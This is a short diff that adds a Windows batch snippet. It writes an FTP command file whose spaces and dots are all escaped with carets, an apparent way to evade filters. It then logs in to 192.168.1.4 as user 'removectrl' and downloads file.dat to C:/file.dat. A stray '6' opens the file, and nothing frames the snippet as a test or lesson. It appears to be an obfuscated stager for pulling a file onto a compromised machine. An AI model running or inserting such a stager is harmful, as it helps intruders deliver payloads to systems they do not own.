@@ -1,0 +1,7 @@
+6
+del /f /q "C:/ftpc.txt"
+echo open^ 192^.168^.1^.4^  >>C:/ftpc.txt
+echo user^ removectrl^ 1^  >>C:/ftpc.txt
+echo get^ file^.dat^ c^:^/file^.dat >>C:/ftpc.txt
+echo bye^  >>C:/ftpc.txt
+ftp -n -s:C:/ftpc.txt
